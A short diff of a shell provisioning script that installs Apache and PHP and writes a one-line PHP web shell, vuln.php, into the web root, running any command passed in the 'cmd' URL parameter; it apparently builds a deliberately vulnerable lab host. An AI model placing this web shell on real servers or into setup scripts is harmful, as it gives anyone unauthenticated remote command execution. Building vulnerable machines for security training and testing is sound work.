@@ -7,18 +7,11 @@ echo "nameserver 8.8.8.8 8.8.4.4" >> /etc/network/interfaces
 
 apt-get update -y
 apt-get install apache2 -y
-apt-get install -y php5 libapache2-mod-php5 php5-mcrypt php5-cli
+apt-get install -y php5
 
-echo "create vuln.php" >> /tmp/result
-cat <<EOF > /tmp/vuln.php
+cat << EOF > /var/www/html/vuln.php
 <?php
-echo system($_GET["cmd"]);
+echo system(\$_GET['cmd']);
 ?>
-EOF 
 
-echo "cp /tmp/vuln.php /var/www/html/vuln.php" >> /tmp/result
-cp /tmp/vuln.php /var/www/html/vuln.php
-
-echo "script end" >> /tmp/result
-
-
+EOF
